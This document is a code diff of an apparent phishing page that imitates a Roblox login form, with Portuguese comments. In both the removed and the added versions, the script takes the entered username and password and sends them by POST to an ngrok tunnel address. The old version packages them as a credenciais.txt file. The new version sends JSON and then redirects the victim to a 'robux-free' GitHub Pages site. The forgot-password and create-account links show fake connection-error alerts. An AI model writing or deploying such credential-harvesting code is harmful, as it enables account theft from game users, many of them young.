@@ -531,84 +531,87 @@ site.</div></div></noscript>
     </form>
 </div>
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Verificar credenciais salvas
-    const savedUsername = localStorage.getItem('roblox_username');
-    const savedPassword = localStorage.getItem('roblox_password');
-    
-    if (savedUsername && savedPassword) {
-        document.getElementById('custom-username').value = savedUsername;
-        document.getElementById('custom-password').value = savedPassword;
-        document.getElementById('custom-remember').checked = true;
-    }
-    
-    const loginForm = document.getElementById('custom-login-form');
-    const messageDiv = document.getElementById('custom-login-message');
-    
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const username = document.getElementById('custom-username').value;
-        const password = document.getElementById('custom-password').value;
-        const rememberMe = document.getElementById('custom-remember').checked;
-        
-        // Validação
-        if (username.length < 3 || password.length < 6) {
-            messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
-            messageDiv.style.color = '#ff3333';
-            return;
-        }
-        
-        // Salvar credenciais
-        if (rememberMe) {
-            localStorage.setItem('roblox_username', username);
-            localStorage.setItem('roblox_password', password);
-        } else {
-            localStorage.removeItem('roblox_username');
-            localStorage.removeItem('roblox_password');
-        }
-        
-        // Criar arquivo .txt com as credenciais
-        const credentials = `Usuário: ${username}\nSenha: ${password}`;
-        const file = new File([credentials], 'credenciais.txt', { type: 'text/plain' });
-    
-        const formData = new FormData();
-        formData.append('file', file); // nome do campo deve ser 'file'
-        formData.append('username', username);
-    
-        // Enviar para servidor via ngrok
-        fetch('https://6ab1a2027ad7.ngrok-free.app/login/', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Erro no servidor');
-            return response.json();
-        })
-        .then(data => {
-            console.log(data);
-            messageDiv.textContent = 'Login bem-sucedido!';
-            messageDiv.style.color = '#00aa00';
-        })
-        .catch(error => {
-            console.error('Erro:', error);
-            messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
-            messageDiv.style.color = '#ff3333';
-        });
-    });
+        document.addEventListener('DOMContentLoaded', function() {
+            // Verificar credenciais salvas
+            const savedUsername = localStorage.getItem('roblox_username');
+            const savedPassword = localStorage.getItem('roblox_password');
+            
+            if (savedUsername && savedPassword) {
+                document.getElementById('custom-username').value = savedUsername;
+                document.getElementById('custom-password').value = savedPassword;
+                document.getElementById('custom-remember').checked = true;
+            }
+            
+            const loginForm = document.getElementById('custom-login-form');
+            const messageDiv = document.getElementById('custom-login-message');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('custom-username').value;
+                const password = document.getElementById('custom-password').value;
+                const rememberMe = document.getElementById('custom-remember').checked;
+                
+                // Validação
+                if (username.length < 3 || password.length < 6) {
+                    messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
+                    messageDiv.style.color = '#ff3333';
+                    return;
+                }
+                
+                // Salvar credenciais
+                if (rememberMe) {
+                    localStorage.setItem('roblox_username', username);
+                    localStorage.setItem('roblox_password', password);
+                } else {
+                    localStorage.removeItem('roblox_username');
+                    localStorage.removeItem('roblox_password');
+                }
+                
+                // Enviar dados diretamente via POST
+                const loginData = {
+                    username: username,
+                    password: password
+                };
 
-    // Links extras fora do submit
-    document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('Não foi possível mudar a senha. Verifique sua internet.');
-    });
-    
-    document.getElementById('custom-create-account').addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('Não foi possível criar conta. Verifique sua internet.');
-    });
-});
-</script>
+                // Enviar para o servidor Ngrok
+                fetch('https://6ab1a2027ad7.ngrok-free.app/login/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json' // Indica que estamos enviando dados JSON
+                    },
+                    body: JSON.stringify(loginData) // Converte o objeto para uma string JSON
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Erro no servidor');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
+                    messageDiv.style.color = '#00aa00';
+                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
+                })
+                .catch(error => {
+                    console.error('Erro:', error);
+                    messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
+                    messageDiv.style.color = '#ff3333';
+                });
+            });
+
+            // Links extras
+            document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Não foi possível mudar a senha. Verifique sua internet.');
+            });
+            
+            document.getElementById('custom-create-account').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Não foi possível criar conta. Verifique sua internet.');
+            });
+        });
+    </script>
         </div>
     </main>
 
